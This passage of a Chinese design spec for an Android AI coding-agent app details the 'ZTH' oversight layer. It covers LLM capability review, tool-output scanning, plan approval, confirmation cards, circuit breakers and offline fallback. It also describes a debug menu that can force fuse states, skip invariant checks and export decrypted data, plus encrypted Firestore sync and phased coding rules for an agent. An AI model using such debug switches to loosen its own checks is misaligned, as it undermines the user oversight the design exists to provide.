        clickResetJob.value = CoroutineScope(Dispatchers.Main).launch {
            delay(1500L); consecutiveClicks = 0
        }
        consecutiveClicks += 1
        when (consecutiveClicks) {
            in 1..6 -> Toast.makeText(ctx, "还剩 ${7-consecutiveClicks} 次开启 ZTH 开发者菜单", LENGTH_SHORT).show()
            7 -> {
                Toast.makeText(ctx, "✅ 已开启 ZTH 开发者菜单", LENGTH_LONG).show()
                // 写入 DataStore：zth_dev_menu_enabled = true（FeatureFlag 新增字段）
                zthDevMenuEnabled.value = true
                consecutiveClicks = 0
            }
        }
    }
)

// 设置页：当 zth_dev_menu_enabled.value == true 时，在「关于」上方显示「🛠 ZTH 开发者菜单」入口项
// 点击 → 导航到 ZthDevMenuScreen
```

**C.4.17.2 14 菜单项完整清单（精确到 BuildConfig 可见性）**：

```
ZthDevMenuScreen（LazyColumn 14 个分组，每个 Switch/Button/Chip）
危险等级：🔴 debug-only（release 版完全隐藏，不编译进入口）
          🟡 debug 解锁显示（release 版需要开启 zth_dev_menu_enabled 才显示，但不提供危险操作）
          🟢 release 安全（任何版本可见，只读 / 不改变架构状态）

┌─ 分组 1：Fuse 操作（2 项）
│  1 🟡 手动切 fuse 态：下拉选 SESSION/GLOBAL scope → 选 sessionId（全部会话列表）→ 选 6 态（不含 TRANSITIONING）→ 写 DB（LINK-INV 铁律不校验，Debug 模式允许破坏）
│  2 🟢 查看 CircuitBreaker 最近 20 条跃迁历史（只读，展示 from→to/reason/timestamp）
│
├─ 分组 2：Sentinel & Card（3 项）
│  3 🔴 查看当前所有 sentinel：列表显示 sentinel_id 前 8 位 + state + level + ✅明文 sentinel_content（debug 专用，方便开发比对检查点 hash）
│  4 🟡 强制触发 20 SubClass 各 1 次：20 个独立按钮 → 按下立即生成对应 ConfirmationType 的 ConfirmationCard（用于测试 20 模板 UI 是否对齐）
│  5 🟡 手动触发崩溃恢复 runRecovery()：点击跑 C.4.3 4 步，Toast 显示 RecoveryStats 结果
│
├─ 分组 3：LLM 审查 & 离线降级（3 项）
│  6 🟡 开关「跳过 LLM 审查直接弹手动确认」：开启后 isZeroRiskHeuristic 全返回 false，所有工具（含 echo/pwd）强制弹 ConfirmationCard（测试离线手动模式 UI 路径）
│  7 🟢 模拟断网离线模式 10 分钟：开启后 ConnectivityWatcher.isOffline 强制覆写为 true（即使实际有网），10 分钟后自动恢复；剩余时间实时显示
│  8 🟡 设置 CapabilityGuard 审查超时：Slider 选 800ms / 2s / 4s / 8s（默认）/ 20s（压测超时降级路径是否正确触发 E11）
│
├─ 分组 4：DB 一致性 & Migration（3 项）
│  9 🟢 查看 5 张 ZTH 表行数：Toast 显示 "Sentinel=X Fuse=Y Rejection=Z DeleteAudit=A L0Log=B Telemetry=C"
│  10 🟡 手动触发 fallback 重建 ZthDbAutoReconciler.runAfterDestructiveFallbackIfNeeded()（不真的清库，只模拟 count=0 跑 3 步）
│  11 🟢 手动触发 DB 一致性自检 runConsistencySelfCheck()：显示检测到 X 条 sentinel 计数不一致，Y 条 fuse 计数不一致；提供「自动修数」按钮（默认只展示不操作）
│
├─ 分组 5：运行时参数 & 性能（2 项）
│  12 🟢 查看 4 预设包 × 30 参数实时值：表格形式显示（例如 l0_elapsed_threshold=6s，batch_size=20，CONSECUTIVE_HALLUC=3，SENTINEL_EXPIRE_MS=24h）
│  13 🟡 模拟 MemoryPressure TRIM_MEMORY_COMPLETE：触发 ComponentCallbacks2.onTrimMemory（测试 PerformanceClassRepository 临时禁用 ZTH 60 秒路径是否生效）
│
└─ 分组 6：导出 & 调试专用（1 项）
   14 🔴 导出所有 ZTH 表明文（debug 专用）：压缩到 filesDir/zth_debug_export_plaintext_TIMESTAMP.zip（含 sentinel_content Keystore 解密后明文、fuse 全列、审计表全列、telemetry 全列）→ 分享给开发者
      Release 版：完全隐藏（不注册入口，不在菜单中显示）
```

---

#### C.4.18 ✅ C.2.14 跨设备同步 → 方案 C：v1.0 直接实现 Firestore 完整双向同步

> **注意：用户拍板方案 C（一步到位高复杂度）**，不是方案 A 预留字段。本节精确到 Firestore 集合结构、双向合并策略、Keystore 明文跨设备加密。

**C.4.18.1 DB Schema v37 预留字段（同步要用，不再是 NULL 占位）**：

```sql
-- 5 ZTH 表各加 2 列（sync_key + sync_updated_at），DB v37 Migration 时加（不等到 v38）
ALTER TABLE user_confirmed_sentinel ADD sync_key TEXT DEFAULT NULL;
ALTER TABLE user_confirmed_sentinel ADD sync_updated_at INTEGER DEFAULT 0;
ALTER TABLE zth_hallucination_fuse ADD sync_key TEXT DEFAULT NULL;
ALTER TABLE zth_hallucination_fuse ADD sync_updated_at INTEGER DEFAULT 0;
-- 其余 3 张审计表（rejection/delete/l0Log）：同样加 2 列
```

**C.4.18.2 Firestore 集合结构（6 个子集合，按 device 隔离）**：

```
Firestore DB 根 / users/{userId}/zth/    （userId = 匿名 Firebase UID，不关联用户邮箱）
├─ devices/{deviceId}                    ← 每台设备一条文档，含 last_online_ts / keystoreWrappedKey
│    ├─ sentinel_snapshots/{sync_key}    ← 所有 sentinel 同步记录（sync_key = sessionId 的 hash）
│    │    { state_ordinal, level_ordinal, rejection_count, content_encrypted_base64,
│    │      content_signature, plan_uid, cp_id, created_at, confirmed_at, execution_mode }
│    │
│    ├─ fuse_snapshots/{sync_key}        ← SESSION/GLOBAL 级 fuse 文档
│    │    { scope_ordinal, session_id, fuse_state_ordinal, rejection_count,
│    │      consecutive_halluc_count, last_reason, transition_at, cooldown_end, version }
│    │
│    ├─ rejection_audit/{sync_key}       ← 3 张审计表同理
│    ├─ hard_delete_audit/{sync_key}
│    └─ l0_compact_log/{sync_key}
```

**C.4.18.3 双向同步 & 冲突合并（严格 LWW 最后写入者胜，不引入 CRDT）**：

```kotlin
@Singleton
class ZthFirestoreSyncer @Inject constructor(
    private val firestore: FirebaseFirestore,
    private val auth: FirebaseAuth,  // 匿名登录 signInAnonymously()，v1.0 不强制用户绑定邮箱
    private val crypto: ZthSensitiveColumnCrypto,  // C.4.8 Keystore
    private val zthSharedSyncKey: ZthSharedSyncKeyStore, // 跨设备共享 256 位对称密钥（非 Keystore 绑定设备）
) {
    /* 同步 3 阶段（每 15 分钟 WorkManager 触发 + 用户手动下拉刷新触发）：
     * ┌─ Stage 1：PULL（云端 → 本地 DB）───────────────────────────────────
     *   对每个集合：firestore.collection(...).where("sync_updated_at", ">", lastPulledAt)
     *   → 拿到 N 条云端变更 → 和本地同 sync_key 行比较：
     *   → 云端 sync_updated_at > 本地 sync_updated_at → 云端覆盖写入本地（LWW）
     *   → 否则跳过（本地更新）
     *
     * ┌─ Stage 2：PUSH（本地 DB → 云端）───────────────────────────────────
     *   对每个集合：本地 WHERE sync_updated_at > lastPushedAt
     *   → 拿到 M 条本地变更 → 写云端 doc（set with merge=true）
     *   → sentinel_content_cipher（Keystore 加密的本地 BLOB）不能直接上云（跨设备密钥不同会解密失败）
     *   → ✅ 上传前先用 ZthSharedSyncKey（跨设备共享 256 位 AES-GCM）重新加密：
     *        cloud_payload.content_encrypted_base64 =
     *          AES-GCM(key=shared_sync_key, iv=random_12byte,
     *                   plaintext=Keystore.decrypt(local_cipher_blob))
     *      → 云端存储的是 "共享密钥加密的明文"，不是 Keystore 设备绑定密文
     *
     * ┌─ Stage 3：内容完整性校验（防止云端 sentinel_content 被篡改）──────────
     *   云端 doc 带 content_signature = HMAC-SHA256(sentinel_content_plain, shared_sync_key)
     *   对端设备 PULL 下来：先 verify HMAC → 通过 → 用 shared_sync_key 解密
     *   → 再用本设备 Keystore 重新加密，写本地 sentinel_content_cipher BLOB
     *   → 失败（HMAC 不通）：跳过该条，记 FileLogger.e("同步完整性校验失败 sync_key=X")
     *   → 不写本地（宁可丢同步也不接受被篡改的 sentinel 内容）
     */

    /** 冲突不变性：
     *   两台设备同时操作同一条 sentinel（手机点 CONFIRM / 平板点 REJECT）
     *   → 写云端时间戳较晚的赢（LWW）
     *   → 较早的一方 Stage 1 PULL 时自动被覆盖为晚的那一方状态
     *   → 不引入 CRDT（复杂度高），也不做 3-way merge（容易出错）
     */
}
```

**C.4.18.4 ZthSharedSyncKey（跨设备共享密钥分发）**：

```kotlin
/* 用户首次开 ZTH Firestore 同步（设置页「开启多设备同步」首次开关）：
 *   1. 生成 32 字节 shared_sync_key（SecureRandom）
 *   2. 用 用户输入的「同步口令」（8~32 位用户自定义）做 Argon2id 派生 256 位口令密钥
 *   3. AES-GCM(key=口令派生, plaintext=shared_sync_key) → 导出为 "ZTH-SYNC:<base64>..." 8 个助记词（BIP-39 词表）
 *   4. 用户在另一台设备开同步 → 输入 8 个助记词 + 同步口令 → 还原 shared_sync_key → 所有文档正确解密
 *
 * 不变性 SYNC-INV-1：
 *   绝对不把 shared_sync_key 明文写云端、不写 Firestore、不写 Firebase Remote Config。
 *   shared_sync_key 的唯一分发方式 = 用户备份 8 个助记词，纯线下纸记 / 密码管理器存。
 */
```

---

### C.5 讨论完成汇总

#### C.5.1 23 遗漏话题决策闭环总表（✅ 全部拍板）

| 编号 | 话题（原文 C.1~C.2） | 风险 | 拍板方案 | 文档落地位置 |
|---|---|---|---|---|
| 1 | C.1.5 权限系统 vs ZTH Card 挂起点冲突 | 🔴 阻断 | ✅ A：ZTH 汇总卡 → 权限弹窗串行，ALWAYS 单条不弹窗但总卡必弹 | C.4.1 |
| 2 | C.2.4 灰度 kill-switch（ZTH 开关默认值） | 🔴 阻断 | ✅ A：双重 kill-switch，zthModeEnabled 默认关（用户手切） | C.4.2 |
| 3 | C.2.1 崩溃恢复（OOM / 设备重启后 sentinel） | 🔴 阻断 | ✅ A：sentinel<24h 重弹；≥24h 过期清；LINK-INV-0 TRANSITIONING 重跑；半完成续跑 6h | C.4.3 |
| 4 | C.1.3+C.2.13 MCP 第三方工具 Capability 映射 + Skill 正文审查 | 🔴 阻断 | ✅ A：ToolCapability 新增 3 值 + 启发式正则；SKILL.md 正文 ContentReviewer E8 命中弹风险卡 | C.4.4 |
| 5 | C.1.1+C.1.7+C.2.8 远程 SSH 模式 ZTH 适配 | 🔴 阻断 | ✅ B：**v1.0 ZTH 不支持远程 SSH**，模式=REMOTE_SSH → ZTH 钩子全走 legacy；UI 置灰 + 橙色提示 | C.4.5 |
| 6 | C.2.5 多会话并发 & Fuse 隔离 / 乐观锁 | 🔴 阻断 | ✅ A：session 级完全隔离（ConcurrentHashMap factory）；GLOBAL 级 SQL 乐观锁 version 字段；HALF_OPEN 各自计时 | C.4.6 |
| 7 | C.2.2 性能开销（低端机阈值/batch_size/启发式/超时） | 🟡 重要 | ✅ A：RAM≤4/API≤28 默认关+BATCH=20+90% 工具启发式跳过 LLM+8s 超时 E11 降级 | C.4.7 |
| 8 | C.2.3 安全隐私（allowBackup/防误触/加密/脱敏） | 🟡 重要 | ✅ **C：最严格**（SwipeToConfirm 滑动解锁非点击；allowBackup=false+dataExtraction 双排除；sentinel_content Keystore AES-GCM；日志 0 sentinel_id，连前 8 位都不打） | C.4.8 |
| 9 | C.2.6 离线降级（审查/分类/PlanApproval 三档） | 🟡 重要 | ✅ A：只读+白名单 PASS，其余强制手动批；所有 Throwable 全归 E11；PlanApproval 跳过模型不跳过用户确认 | C.4.9 |
| 10 | C.1.6+C.2.7 备份还原 ZTH 字段 & 跨设备密钥兼容 | 🟡 重要 | ✅ A：5 ZTH Dto 全量备份但 sentinel_content 只留 hash；还原本地优先；跨设备 Keystore 不兼容显示「密钥不可用」 | C.4.10 |
| 11 | C.2.12 DB Migration fallback 一致性重建 | 🟡 重要 | ✅ A：fallback 后自动 3 步（写 GLOBAL fuse/不补 sentinel/清零 session 计数）；异步自检不一致 ERROR 记日志自动修数不崩 | C.4.11 |
| 12 | C.1.8 ToolOutputStore 流式 chunk 审查 & CP 临时文件处理 | 🟡 重要 | ✅ A：两阶段审查（10 chunk/64KB 启发式扫→命中立即 ABORT 中断工具；聚合后 LLM 终检）；CP 不管临时文件，hash 不匹配自动重跑 | C.4.12 |
| 13 | C.1.2 终端 Bundle 安装进度同步 & 失败分类 | 🟡 重要 | ✅ **C：8 E11 细分子类（DNS/TLS/代理/签名/网络/404/磁盘/损坏）+ 4 镜像（官方/阿里/清华/中科大）自动切换最多 4 次，全失败才用户接手** | C.4.13 |
| 14 | C.1.9 容器设置包管理器不匹配（apk↔apt↔yum↔pacman） | 🟡 重要 | ✅ A：强制归 E11(PACKAGE_MANAGER_MISMATCH)，CardHeader 顶部蓝色提示用户勾「自动改写」→ 同会话内所有命令 PkgManagerCommandTransformer 互转 | C.4.14 |
| 15 | C.2.9 i18n 双语 & A11y 无障碍 WCAG | 🟡 重要 | ✅ A：zh/en 134 条字符串（10 组全）+ 10 条 A11Y-INV 不变性（48dp/TalkBack/200%滚动/震动/Tab焦点/2重颜色+图标/滑块98%触发/空格键支持） | C.4.15 |
| 16 | C.2.10 埋点遥测校准 ZTH 阈值 | 🟢 次要 | ✅ **B：Room zth_telemetry_event 表 14 指标聚合 + 设置页 4 张自绘 Canvas 图表（饼/直方/热力/箱线+柱），不导出 zip 不接第三方 SDK** | C.4.16 |
| 17 | C.2.11 ZTH 开发者调试菜单 | 🟢 次要 | ✅ A：7 连点开启 + 14 菜单项分 6 组；BuildConfig.DEBUG 隐藏 🔴 明文 sentinel 查看/导出；release 版只开放 🟢 只读项 | C.4.17 |
| 18 | C.2.14 跨设备同步 | 🟢 次要 | ✅ **C：v1.0 直接 Firestore 完整双向同步**（LWW 冲突合并，shared_sync_key 用 Argon2id 用户口令派生为 BIP-39 8 助记词，HMAC 完整性校验，Keystore→共享密钥跨设备重加密） | C.4.18 |
| 19 | C.1.1 容器引擎 LinuxContainerEngine（LOCAL vs REMOTE_SSH 错误归类） | 🔴 阻断 | → 拍板包含在 C.4.5（v1.0 ZTH 不支持 REMOTE_SSH） | 合并 C.4.5 |
| 20 | C.1.4 Skill 系统（requiredTools 信任 & 自动 PermissionRule） | 🔴 阻断 | → 拍板包含在 C.4.4（Skill 4 条铁律）：不自动加 PermissionRule，不白嫖放行 | 合并 C.4.4 |
| 21 | C.1.7 Workspace 系统（文件快照 & Checkpoint 远程） | 🔴 阻断 | → 拍板包含在 C.4.5（v1.0 REMOTE_SSH 禁用，不做 FileSnapshotProvider 双实现） | 合并 C.4.5 |
| 22 | C.2.7 备份还原 ZTH 一致性（幂等策略） | 🟡 重要 | → 拍板包含在 C.4.10（还原本地优先 + GLOBAL fuse 本地为准） | 合并 C.4.10 |
| 23 | C.2.13 Skill + MCP 工具审查路径（UNCLASSIFIED_MCP 默认高风险） | 🔴 阻断 | → 拍板包含在 C.4.4（UNCLASSIFIED_MCP 枚举 + MCP.requireApprovalTools 强制 PlanApproval） | 合并 C.4.4 |

#### C.5.2 新增不变性索引（共 19 条，含拍板讨论时产生的）

```
ZTH 顶层铁律（不变，文档中已有）：ZTH-0 / ZTH-1 / ZTH-2 / ZTH-3（4 条）
LINK-INV 四方联动铁律（不变，文档中已有）：LINK-INV-0~6（7 条）
BANNER-INV 横幅约束（本次讨论新增）：BANNER-INV-1（1 条）
CARD-INV 卡片交互（本次讨论新增）：CARD-INV-5（SwipeToConfirm 替换点击）（1 条）
LOG-INV 日志约束（本次讨论新增）：LOG-INV-1（Tag=Zth 开头 0 id）（1 条）
DB-INV 数据库约束（本次讨论新增）：DB-INV-1（校验失败永不崩）（1 条）
TRANSFORM-INV 改写约束（本次讨论新增）：TRANSFORM-INV-1（包管理器改写同会话有效）（1 条）
A11Y-INV 无障碍（本次讨论新增）：A11Y-INV-1~10（10 条，10 个 WCAG 强制要求）
BURIED-INV 埋点隐私（本次讨论新增）：BURIED-INV-1（图表不展示用户明文）（1 条）
SYNC-INV 跨设备同步（本次讨论新增）：SYNC-INV-1（shared_sync_key 纯线下分发，不上云）（1 条）

合计：4 + 7 + 1 + 1 + 1 + 1 + 1 + 10 + 1 + 1 = 28 条架构红线不变性（编码时每条都是合规 checklist，违反 = 架构违规）
```

---

### C.6 编码实施规范（**严格遵循：禁止无中生有，一切从实际代码出发**）

> 本节定义 **编程前强制执行的 3 步质量机制** + **Preflight 真实扫描纠正的 7 个文档假设偏差** + **Phase 1~5 实际执行顺序**。
> 所有实施动作必须按本节顺序执行。

#### C.6.1 3 步强制质量保障机制（每写一个模块前必须执行）

```
┌─────────────────────────────────────────────────────────────────────┐
│ Phase N：Structured Plan（用户可见规划）                              │
│   ① 用 TodoWrite 列出本 Phase ≤10 条 Actionable Tasks                  │
│   ② 每条 Task 对应真实文件路径（基于 Glob/Grep/LS 已验证存在）          │
│   ③ 标明「修改」/「新增」+ 预估行数 + 不变性覆盖数量                    │
└──────────────────────────────────┬──────────────────────────────────┘
                                   ▼
┌─────────────────────────────────────────────────────────────────────┐
│ Step 1：Preflight Verify（不可见，写代码前强制跑）                     │
│   ① Glob/Grep 真实文件列表：验证文档中假设的 Package/Class/Factory     │
│     /Dao/Entity/Composable 文件名 + 参数签名是否存在                  │
│   ② Read 读取真实文件前 100 行：验证构造函数 @Inject 参数数量/名字/    │
│     包路径 import 是否和文档一致                                      │
│   ③ 发现偏差 → 立即写入 C.6.2 纠正清单 + 更新 C.4.x 中所有涉及的       │
│     伪代码包路径 → 然后才开始写代码                                    │
│   ✅ 零偏差确认通过 → 进入 Step 2                                      │
└──────────────────────────────────┬──────────────────────────────────┘
                                   ▼
┌─────────────────────────────────────────────────────────────────────┐
│ Step 2：实施编码（按 TodoWrite 顺序）                                 │
│   ① 修改类优先：严格遵循 Edit 工具 → Read → old_string 精确匹配 →      │
│     替换 new_string → 禁止用 Write 覆盖现有类                          │
│   ② 新增类：Write 工具写新文件（文件路径符合 Preflight 验证过的包结构） │
│   ③ 每行写完对照 C.5.2 28 条不变性，逐条核对                           │
└──────────────────────────────────┬──────────────────────────────────┘
                                   ▼
┌─────────────────────────────────────────────────────────────────────┐
│ Step 3：Postflight Diff（不可见，写代码后强制跑）                      │
│   ① 静态交叉引用校验：所有新写类的 import（Fully Qualified Name）用     │
│     Glob 确认对端文件存在（避免写 Unresolved Reference）               │
│   ② 枚举/常量/注解引用：文档 C.4.x 新增枚举值 → grep 确认所有 enum     │
│     类中都有对应 ordinal 位置                                         │
│   ③ 文件大小合理性校验：新增单文件 > 600 行 → 自动拆分单例职责（SRP）   │
│   ④ 修改文件行数 ≤ 40%：如果 Edit 使某文件长度变化超过 40% → 暂停、   │
│     检查是否把不相关代码也改了，分拆 Edit                              │
│   ✅ 全部通过 → 本 Phase 标记 TodoWrite completed，进入下一 Phase       │
└─────────────────────────────────────────────────────────────────────┘
```

**机制不可变更性 MECHANISM-INV-1**：只要出现「Preflight Verify 未通过但直接开始写代码」→ 立即停止、回滚已写内容，先补完 C.6.2 纠正清单。禁止先写后改路径。

#### C.6.2 Preflight 真实扫描 → 文档 7 个包路径假设纠正清单

> 运行 Glob/Grep/LS/Read 真实代码（AgentModule/AgentDatabase/StatefulAgentWorkflow）后发现的文档 C.4.x 中 7 处错误路径，全部纠正为下表中的**真实路径**。所有后续编码 / C.4.x 伪代码严格按真实路径使用。

| 编号 | 文档 C.4.x 中错误假设包路径 | 真实代码实际路径（Glob/Grep/Read 验证） | 影响的 C.4.x 章节 |
|---|---|---|---|
| P1 | `com.R.codecore.database.*Dao.kt`（错误）→ 假设统一放在 `database` 包 | `com.R.codecore.feature.agent.data.local.dao.*`（真实 9 个 DAO）+ `com.R.codecore.feature.credentials.data.local.dao.*` + `com.R.codecore.feature.settings.data.local.dao.*` + `com.R.codecore.feature.workspace.data.local.dao.*`（按功能子域分包，非大一统 database 包） | C.4.6 / C.4.10 / C.4.11 / C.4.16 / C.4.18：新增 6 个 ZTH DAO 必须进 `feature/agent/data/local/dao/`，不能建独立 `database/` 包 |
| P2 | `com.R.codecore.database.*Entity.kt`（错误）→ 假设统一放在 `database` 包 | `com.R.codecore.feature.agent.data.local.entity.*`（真实 6 个 Entity）+ `credentials/settings/workspace` 对应子域 entity 包 | C.4.8 / C.4.10 / C.4.18：6 个 ZTH Entity（5 张表 + telemetry）必须放 `feature/agent/data/local/entity/`，且 `@Database(entities=[...])`（AgentDatabase.kt L28）数组必须加上对应的 `class` 引用 |
| P3 | `AgentDatabase` 位于 `com.R.codecore.database.AgentDatabase`（错误） | **真实**：`com.R.codecore.feature.agent.data.local.database.AgentDatabase`（AgentModule.kt L16 import）；SCHEMA_VERSION 真实值 = 33（AgentDatabase.kt L47）→ v33 → v37（+1 次/每张新表）共 4 次 Migration 必须在 `core.db.MigrationLoader`（AgentModule.kt L67 import）中注册 | C.4.11 / C.4.18：v33→v37 SQL + MigrationLoader.register() |
| P4 | `HallucinationCircuitBreakerFactory` 提供单独 ZthModule.kt（错误：假设新建 Zth DI Module） | 真实只有 3 个 Module：`AgentModule.kt` / `BackupModule.kt` / `RepositoryModule.kt`（Glob 验证）→ **不新建 ZthModule.kt**，所有 ZTH 20+ @Provides 全部追加在**现有 AgentModule 对象内**（L71 `object AgentModule` 内加 @Provides 函数） | C.4.2 / C.4.6：FeatureFlag/HallucinationCircuitBreakerFactory/ZthFirestoreSyncer 必须在 AgentModule.kt 原文件内扩展 |
| P5 | `FeatureFlagRepository` 假设 package 顶层独立 | 真实所有 Repository 按子域分包：`feature/settings/data/repository/` + `feature/agent/data/repository/` + `feature/workspace/domain/repository/` → FeatureFlagRepository 属于设置功能，**真实路径必须是** `com.R.codecore.feature.settings.data.repository.FeatureFlagRepository` | C.4.2：新建文件路径必须对齐，不能放 `core/data/` 等 |
| P6 | `ZthSensitiveColumnCrypto` 假设放 `feature/agent/domain/`（错误）| 真实加密工具放在 `com.R.codecore.core.util.*` / `com.R.codecore.core.db.*`（核心工具类子域）→ **真实路径必须是** `com.R.codecore.core.crypto.ZthSensitiveColumnCrypto`（新建 `core/crypto` 包，和 core.util/core.db 对齐） | C.4.8：Keystore 加密实现必须放 `core/crypto/` 跨 feature 可复用 |
| P7 | StatefulAgentWorkflow 当前真实构造函数参数 = 20 个（L67~L90 验证），文档 C.4.2 中假设只加 `featureFlags` 1 个参数 → 错误地忽略 ExecutionModeHolder/PerformanceClass/ConnectivityWatcher/PkgMgrCommandTransformer 4 个**必须新增的注入** | 真实 StatefulAgentWorkflow.kt L67~L90：`@Inject constructor(toolRegistry, aiProviderRepository, openAIApi, anthropicApi, geminiApi, promptProvider, permissionManager, policyEngine, contextCompactor, planApprovalManager, toolOutputStore, modelMetadataService, visionModelSettingsRepository, compactionModelSettingsRepository, compatibilityPolicyRepository, sessionUseCase, messagePersistenceUseCase, checkpointManager)`（共 18 个）→ 要追加的参数 = **5 个**：① featureFlags ② performanceClass ③ connectivityWatcher ④ zthGuardAggregateFacade（CapabilityGuard+FailureClassifier+ToolOutputGuard+PlanApproval 门面包 1 个，避免构造函数变成 30+ 参数）⑤ pkgMgrTransformer（C.4.14）→ 共 23 个构造参数 | C.4.1 / C.4.9 / C.4.12 / C.4.14：所有 ZTH 钩子不要拆成 8 个独立 inject → 用门面 ZthGuardAggregateFacade 聚合，避免构造爆炸 |

#### C.6.3 Phase 1~5 执行顺序（按耦合度 & 真实依赖分层）

```
Phase 1 / 基础骨架（DB + Enum + Crypto + Telemetry + Firestore 数据结构）
  目标：所有 ZTH 依赖的持久化层 + 枚举 + 核心工具类先编译通过
  先做理由：Room Entity/DAO/Enum 不依赖任何 ZTH 类（零耦合），独立单元测试最快
  真实文件落地（纠正 P1~P7 后路径）：
  1. Enum & 常量定义（先做，防止其他类 Unresolved Reference）
     - 新增：SubClass 扩展 4~5 个值（INFRA_PACKAGE_* / INFRA_PACKAGE_MANAGER_MISMATCH）→ 真实枚举文件位置先 Preflight Grep 确认
     - 新增：FuseState.TRANSITIONING（C.4.3）→ 真实 FuseState 枚举文件 Preflight Grep 确认
     - 新增：ToolCapability 3 个新值（C.4.4）→ 真实 ToolCapability 枚举文件 Preflight Grep 确认
  2. DB v33→v37 Migration
     - 新增：6 Entity（UserConfirmedSentinelEntity + HallucinationFuseEntity + SentinelPlanRejectionAuditEntity + HardConstraintDeleteAuditEntity + L0SoftCompactRestoreLogEntity + ZthTelemetryEventEntity）→ feature/agent/data/local/entity/（P2 纠正）
     - 新增：6 DAO（对应上 6 Entity）→ feature/agent/data/local/dao/（P1 纠正）
     - 修改：AgentDatabase.kt（L28 entities 数组 + L34~L44 abstract fun + SCHEMA_VERSION=33→37 + L46 companion）→ Preflight 验证 AgentDatabase.kt 真实文件
     - 新增：4 Migration SQL + 注册到 MigrationLoader.register()（AgentModule L67 import core.db.MigrationLoader → Preflight 真实路径）
  3. Crypto 核心工具
     - 新增：ZthSensitiveColumnCrypto → core/crypto/ZthSensitiveColumnCrypto.kt（P6 纠正）
     - 新增：ZthSharedSyncKeyStore → core/crypto/ZthSharedSyncKeyStore.kt（C.4.18 跨设备共享密钥）
  4. Telemetry Room 表（Phase 1 先建表，画图 Phase 4 做）
     - 已包含在 (2) 的 ZthTelemetryEventEntity / ZthTelemetryDao
  5. Firestore 模型数据类（v1.0 不写同步逻辑，先写数据结构，避免 Phase 5 写 Syncer 时 Unresolved）
     - 新增：Firestore Dto 6 个（Sentinel/Fuse/Rejection/Delete/L0Log/Telemetry Firestore 对应 Dto）→ feature/agent/data/remote/zth/
     - 单测：Entity ↔ FirestoreDto 双向映射（Keystore → SharedSyncKey 重加密路径 unit test 覆盖）

Phase 2 / ZTH Core Domain（7 子系统门面 + CapabilityGuard + FailureClassifier + PlanApproval + ContentReviewer）
  目标：写纯 Kotlin 类（无 Room/无 Hilt/无 Compose），100% JUnit 可测
  依赖：只依赖 Phase 1 Enum + Crypto + Entity Dto（不依赖真实 DB，DAO 全部用 Fake 接口）
  真实落地（纠正 P7：用 ZthGuardAggregateFacade 门面，不把 8 类直接注入 StatefulAgentWorkflow）：
  1. 门面包：ZthGuardAggregateFacade（C.4.1/C.4.9/C.4.12/C.4.14 聚合入口）
     - 内部持有：CapabilityGuard / FailureClassifier / PlanApprovalManager / ToolOutputGuard / ContentReviewer / OfflineDegradeSwitch
     - 暴露 4 个挂起函数：preToolCallAudit() / postThrowableClassify() / postToolCompletedAudit() / transformPkgMgrCommand()
  2. ZthCapabilityGuard（C.4.4 MCP 启发式 + C.4.7 零风险启发式 + 8s 超时 BATCH=20）
  3. ZthFailureClassifier（C.4.9 离线归 E11 + C.4.13 8 SubClass 细映射 + C.4.14 pkg mismatch 前置检测 + 原 6×20 决策矩阵）
  4. ZthPlanApproval（C.4.9 离线跳过模型不跳过用户确认 + 档位 2/3 模型审批）
  5. ZthToolOutputGuard（C.4.12 两阶段：chunk 增量 10/64KB 启发扫 + 聚合 LLM 终检）
  6. ZthContentReviewer（C.4.4 Skill 正文 E8 20+ 危险正则）
  7. TerminalBundleMirrorRotator（C.4.13 4 镜像 90 秒超时 4 次自动切重试）
  8. 单测全覆盖（JUnit + MockK 伪 DAO/伪 LLM）：每条决策矩阵 20 SubClass × 3 档 + CapabilityGuard 启发式 21 条规则全 hit/miss

Phase 3 / CircuitBreaker + ConfirmationCard（状态机 + 四方联动 + 卡 UI）
  目标：CircuitBreakerFactory + ConfirmationCard VM/UI + 4 方 LINK-INV 强制迁移
  依赖：Phase 1（Entity/DAO）+ Phase 2（FailureClassifier 输出 FailureClassification）
  真实落地（纠正 P4：所有 @Provides 加在 AgentModule.kt 原对象内）：
  1. HallucinationCircuitBreaker（状态机 6 态+TRANSITIONING/C.4.6 session 级隔离+GLOBAL 乐观锁）
  2. HallucinationCircuitBreakerFactory（C.4.6 ConcurrentHashMap<sessionId, CircuitBreaker> 缓存）→ AgentModule.kt 内加 @Provides（P4 纠正）
  3. LINK-INV-0~6 强制迁移事务（@Transaction relinkInvocationZero() → 4 写 + version 原子）
  4. ZthConfirmationCardViewModel（C.4.1/C.4.3：suspendAwaitUserConfirm + SwipeToConfirm 回调）
  5. Composable UI（SwipeToConfirm + ZthConfirmationCard 20 模板 + ChainOverviewCard 3 层进度 + 3 横幅 FuseOpen/HalfOpen/Offline BANNER-INV-1）
  6. Composable UI（ZthPresetSelector 档位 0~3 + ZthCapabilityChainOverviewCard + FuseDashboard）
  7. CrashRecoveryHookImpl（C.4.3 4 步重建）+ ZthDbAutoReconciler（C.4.11 fallback 3 步 + 异步自检）
  8. i18n 134 条 @StringRes（C.4.15 zh/en 双 values）+ 10 A11Y-INV 合规（C.4.15 10 条不变性）

Phase 4 / Repository + TelemetryChart + DevMenu + FirestoreSyncer
  目标：DI 注入 / FeatureFlag / Repository 包装 / 自绘图表 / Debug 菜单 / Firestore 同步完整实现
  依赖：Phase 1~3（所有纯 Domain 类和 Entity 接口已完成）
  真实落地（纠正 P4/P5：AgentModule.kt @Provides 加 + FeatureFlag 放 settings 子域）：
  1. FeatureFlagRepository（C.4.2 双重 kill-switch）→ feature/settings/data/repository/（P5 纠正）
  2. PerformanceClassRepository（C.4.7 RAM≤4/API≤28 判定 + onTrimMemory 临时禁用 60s）→ feature/settings/data/repository/
  3. ConnectivityWatcher（C.4.9 NetworkCallback 状态流）→ core/connectivity/ConnectivityWatcher.kt
  4. PkgManagerCommandTransformer（C.4.14 apk↔apt↔yum↔pacman 同会话改写）→ feature/agent/domain/permission/（靠近 ToolPermissionPolicyEngine 同包）
  5. ZthTelemetryDashboard（C.4.16 4 张 Canvas：饼/直方/热力/箱线+柱，BURIED-INV-1 0 明文）→ feature/settings/presentation/component/ZthTelemetryDashboard.kt
  6. ZthDevMenu（C.4.17 7 连点 + 14 菜单项 + BuildConfig 隐藏）→ feature/settings/presentation/ZthDevMenuScreen.kt
  7. ZthFirestoreSyncer（C.4.18 Stage 1/2/3：PULL + PUSH（SharedSyncKey 重加密）+ HMAC 完整性校验）→ feature/agent/data/remote/zth/ZthFirestoreSyncer.kt
